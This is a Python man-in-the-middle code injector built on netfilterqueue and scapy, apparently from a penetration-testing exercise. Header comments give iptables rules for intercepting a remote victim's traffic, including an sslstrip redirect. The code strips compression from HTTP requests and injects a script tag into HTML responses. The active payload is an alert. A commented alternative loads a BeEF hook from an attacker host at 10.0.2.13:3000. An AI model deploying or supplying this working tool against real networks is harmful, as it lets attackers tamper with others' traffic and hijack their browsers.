# Targeting a remote computer
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

# Testing on the local computer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush

# Targeting a remote computer, using sslstrip
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush

import netfilterqueue
import scapy.all as sc
import re


def set_load(packet, load):
    packet[sc.Raw].load = load
    del packet[sc.IP].len
    del packet[sc.IP].chksum
    del packet[sc.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = sc.IP(packet.get_payload())
    if scapy_packet.haslayer(sc.Raw):
        load = scapy_packet[sc.Raw].load.decode(errors='ignore')
        if scapy_packet[sc.TCP].dport == 80:
        # if scapy_packet[sc.TCP].dport == 10000: # sslstrip
            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
            load = load.replace('HTTP/1.1', 'HTTP/1.0')

        elif scapy_packet[sc.TCP].sport == 80:
        # elif scapy_packet[sc.TCP].sport == 10000: # sslstrip
            injection_code = '<script>alert("code injector");</script>'
            # injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>' # BeEF
            load = load.replace('</head>', injection_code + '</head>')
            content_length_search = re.search(
                '(?:Content-Length:\s)(\d*)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = str(
                    int(content_length) + len(injection_code))
                load = load.replace(content_length, new_content_length)
                load = load.encode()

        if load != scapy_packet[sc.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
